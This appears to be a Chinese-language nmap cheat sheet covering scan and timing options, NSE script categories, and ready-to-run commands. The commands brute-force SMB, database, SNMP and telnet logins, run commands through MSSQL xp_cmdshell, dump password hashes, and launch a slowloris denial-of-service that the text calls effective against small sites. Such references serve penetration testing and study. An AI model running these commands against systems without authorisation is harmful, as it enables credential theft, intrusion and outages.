#  扫描类型

-sP  只探测主机在线情况
-sS  SYN扫描(隐身扫描)
-ST  TCP扫描
-sU  UDP扫描
-sV  系统版本检测


-O   操作系统识别
-scanflags  指定TCP标识位(设置URG, ACK, PSH,RST,SYN,FIN位)

# 时序选项

-T0  偏执的:非常非常慢,用于IDS逃逸
-T1  猥琐的:相当慢,用于IDS逃逸
-T2  有礼貌的:降低速度以消耗更小的带宽,比默认慢十倍
-T3  普通的:默认,根据目标的反应自动调整时间模式
-T4  野蛮的:假定处在一个很好的网络环境,请求可能会淹没目标
-T5  疯狂的:非常野蛮,很可能会淹没目标端口或是漏掉一些开放端口
# 脚本命令参数
-sC          等价于-script=default,使用默认类别的脚本进行扫描 可更换其他类别 
-script=<Lua scripts>               <Lua scripts>使用某个或某类脚本进行扫描,支持通配符描述
-script-args=<n1=v1,[n2=v2,...]>    为脚本提供默认参数
-script-args-file=filename          使用文件来为脚本提供参数
-script-trace                       显示脚本执行过程中发送与接收的数据
-script-updatedb                    更新脚本数据库
-script-help=<scripts>              显示脚本的帮助信息,其中<scripts>部分可以逗号分隔的文件或脚本类别
# 脚本分类
auth          负责处理鉴权证书(绕开鉴权)绕过目标主机得访问控制的脚本
broadcast     在局域网内探查更多服务开启状况,如dhcp/dns/sqlserver等服务
brute         提供暴力破解方式,针对常见的应用如http/snmp等
default       使用-sC或-A选项扫描时候默认的脚本,提供基本脚本扫描能力
discovery     对网络进行更多的信息,如SMB枚举、SNMP查询等
dos           用于进行拒绝服务攻击
exploit       利用已知的漏洞入侵系统
external      利用第三方的数据库或资源,例如进行whois解析
fuzzer        模糊测试的脚本,发送异常的包到目标机,探测出潜在漏洞 intrusive: 入侵性的脚本,此类脚本可能引发对方的IDS/IPS的记录或屏蔽
malware       探测目标机是否感染了病毒、开启了后门等信息
safe          此类与intrusive相反,属于安全性脚本
version       负责增强服务与版本扫描(Version Detection)功能的脚本
vuln          负责检查目标机是否有常见的漏洞(Vulnerability),如是否有MS08_067

# 按脚本分类扫描
# 负责处理鉴权证书(绕开鉴权)的脚本,也可以作为检测部分应用弱口令
nmap --script=auth 192.168.137.*

# 提供暴力破解的方式  可对数据库,smb,snmp等进行简单密码的暴力猜解
nmap --script=brute 192.168.137.*

# 默认的脚本扫描,主要是搜集各种应用服务的信息,收集到后,可再针对具体服务进行攻击
nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.*

# 检查是否存在常见漏洞
nmap --script=vuln 192.168.137.*   

# 在局域网内探查更多服务开启状况
nmap -n -p445 --script=broadcast 192.168.137.4

# 利用第三方的数据库或资源,例如进行whois解析
nmap --script external 202.103.243.110


按应用服务扫描
vnc扫描:
检查vnc bypass
nmap -script=realvnc-auth-bypass 192.168.137.4

检查vnc认证方式
nmap -script=vnc-auth 192.168.137.4

获取vnc信息
nmap -script=vnc-info 192.168.137.4

smb扫描:
smb破解
nmap -script=smb-brute.nse -p445 192.168.137.4

smb字典破解
nmap -script=smb-brute.nse -script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4

smb已知几个严重漏
nmap -script=smb-check-vulns.nse -script-args=unsafe=1 192.168.137.4

查看共享目录
nmap -p 445 -script smb-ls -script-args 'share=e$,path=\,smbuser=test,smbpass=test' 192.168.137.4

smb-psexec: 用登陆凭据作为脚本参数,在目标机器上运行一系列程序(注:需要下载nmap_service)
nmap -script smb-psexec.nse -script-args=smbuser=,smbpass=[,config=] -p445

查看会话
nmap -n -p445 -script=smb-enum-sessions.nse -script-args=smbuser=test,smbpass=test 192.168.137.4

系统信息
nmap -n -p445 -script=smb-os-discovery.nse -script-args=smbuser=test,smbpass=test 192.168.137.4

Mssql扫描:
猜解mssql用户名和密码
nmap -p1433 -script=ms-sql-brute -script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4

xp_cmdshell 执行命令
nmap -p 1433 -script ms-sql-xp-cmdshell -script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=”net user” 192.168.137.4

dumphash值
nmap -p 1433 -script ms-sql-dump-hashes.nse -script-args mssql.username=sa,mssql.password=sa 192.168.137.4

Mysql扫描:
检查mysql空密码
nmap -p 3306 -script=mysql-empty-password.nse 192.168.1.114

如果没有空密码,则可以使用自带的暴力破解功能尝试破解
nmap -p 3306 -script=mysql-brute.nse 192.168.1.114

如果知道了用户名与密码,可以枚举数据库中的用户
nmap -p 3306 -script=mysql-users.nse -script-args=mysqluser=root 192.168.1.114

枚举mysql用户信息
nmap -p 3306 -script=mysql-enum.nse 192.168.1.114

支持同一应用的所有脚本扫描
nmap -script=mysql-* 192.168.137.4

Oracle扫描:
oracle sid扫描
nmap -script=oracle-sid-brute -p 1521-1560 192.168.137.5

oracle弱口令破解
nmap -script oracle-brute -p 1521 -script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 192.168.137.5

其他一些比较好用的脚本
nmap -script=broadcast-netbios-master-browser 192.168.137.4 发现网关
nmap -p 873 -script rsync-brute -script-args 'rsync-brute.module=www' 192.168.137.4 破解rsync
nmap -script informix-brute -p 9088 192.168.137.4 informix数据库破解
nmap -p 5432 -script pgsql-brute 192.168.137.4 pgsql破解
nmap -sU -script snmp-brute 192.168.137.4 snmp破解
nmap -sV -script=telnet-brute 192.168.137.4 telnet破解
nmap -script=http-vuln-cve2010-0738 -script-args 'http-vuln-cve2010-0738.paths={/path1/,/path2/}' jboss autopwn
nmap -script=http-methods.nse 192.168.137.4 检查http方法
nmap -script http-slowloris -max-parallelism 400 192.168.137.4 dos攻击,对于处理能力较小的站点还挺好用的 'half-HTTP' connections
nmap -script=samba-vuln-cve-2012-1182 -p 139 192.168.137.4

不靠谱的脚本:
vnc-brute 次数多了会禁止连接
pcanywhere-brute 同上